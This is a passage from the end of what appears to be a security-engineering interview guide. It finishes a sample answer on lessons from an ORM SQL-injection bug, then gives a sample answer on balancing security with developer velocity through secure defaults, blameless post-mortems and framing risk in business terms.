- ORMs protect parameterized *values*, not necessarily all query construction. Every place user input touches a query, even indirectly, needs scrutiny.
- I had a mental model of "ORMs = safe" that was wrong. Since then, I've added SAST rules that flag any use of user input in `order_by`, `group_by`, or `raw` calls.
- After finding it, I did a codebase-wide search for similar patterns, not just fixed the one instance. Found two more.
- We added a mandatory security review checklist item for any query that incorporates user input — not just the where clause.

The meta-lesson was that security vulnerabilities thrive in the gap between "I think this is safe" and "I've actually verified this is safe." The two are very different, and I've since treated them differently.

---

**Q21. How do you think about balancing security with developer velocity? How do you win over engineers who see security as a blocker?**

**Sample Answer:**
Security has a reputation problem in engineering orgs because it's historically shown up as "no" — as the team that slows things down, blocks deployments, and adds friction without explaining why. That reputation is earned when security is done badly, and it needs to be actively dismantled.

My approach is to position security as an enabler, not a gatekeeper:

**Make security easy to do correctly.** If the secure path requires more work than the insecure path, engineers under deadline pressure will take the insecure path. Build secure defaults into your frameworks, libraries, and scaffolding so developers don't have to think about it. Make insecure patterns require extra effort.

**Show, don't tell.** Instead of issuing a policy that says "you must use parameterized queries," write a library that makes parameterized queries the only easy way to query the database. Instead of a compliance checklist, give engineers a tool that checks their code automatically.

**Invest in developer education, not shame.** When a vulnerability is found, do a blameless post-mortem. The question isn't "who wrote the bad code" — it's "why did our process allow this to ship?" Build the systemic fix, then share the learning broadly. Turn every bug into institutional knowledge.

**Be a partner in design, not just in review.** Show up in architecture discussions early. "I was thinking about the threat model for this feature — can I walk you through what I'm worried about and how we might address it?" is a very different relationship than showing up after the PR is written with a list of required changes.

**Quantify risk in business terms.** Engineers and product managers respond to "this vulnerability could allow attackers to access any user's payment information, which is a GDPR incident affecting all EU users, potentially €20M in fines" much better than "this is a CWE-89 SQL injection of critical severity." Translate technical risk into business impact.

**Give engineers autonomy within guardrails.** The best security programs set clear requirements and constraints, then trust engineers to meet them. Constant micromanagement of security implementation creates resentment and slows velocity far more than good guardrails do.

---

That's 21 deep-dive questions covering injection, authentication, cryptography, web security, SSRF, supply chain, secrets management, TLS, CI/CD, threat modeling, and engineering culture. Each question is calibrated to separate engineers who understand security conceptually from those who've actually built, broken, and fixed real systems.